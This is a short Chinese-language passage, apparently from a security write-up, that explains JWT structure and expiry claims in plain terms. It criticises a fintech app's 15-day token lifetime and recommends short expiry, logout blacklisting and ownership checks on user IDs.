在继续之前，让我用简单的语言解释什么是 JWT。

当你登录一个网站时，服务器需要一种方式来记住你是谁。一种流行的方法是给你一个令牌——一小段文本，写着”嘿，这个人已登录，他们的用户 ID 是 4218，这个令牌在这个日期之前有效。”

这个令牌叫做 JWT——JSON Web Token。

它看起来像三段由点连接的文本：

  • Header 说明了令牌类型和使用的签名算法
  • Payload 是实际数据——你的用户 ID、你的角色（管理员或普通用户）、令牌创建时间和过期时间
  • Signature 就像蜡封。它证明令牌没有被篡改

iat 表示”签发时间”，exp 表示”过期时间”。这些数字是 Unix 时间戳——基本上就是用数字存储日期和时间的方式。

那么我解码这个令牌后注意到了什么？

过期时间是创建后的 15 天。

这已经很可疑了。对于一个处理真钱的金融科技应用，15 天太长了。大多数安全应用使用 15 分钟到 1 小时。但过期时间甚至不是最大的问题。

修复方案

过期问题：金融应用的令牌应在 15 分钟到 1 小时内过期。过期后，用户使用”刷新令牌”自动获取新令牌。服务器必须在每个请求上检查过期时间戳。

登出问题：当用户登出时，服务器应将该令牌加入黑名单——一个”死亡令牌”列表。每个传入请求都检查此列表。如果令牌在上面，即使签名有效，也拒绝访问。

替换问题：服务器不应仅信任令牌中的用户 ID。它还应检查令牌中的用户 ID 与正在访问的资源是否匹配。这称为所有权验证，是基本的安全实践。
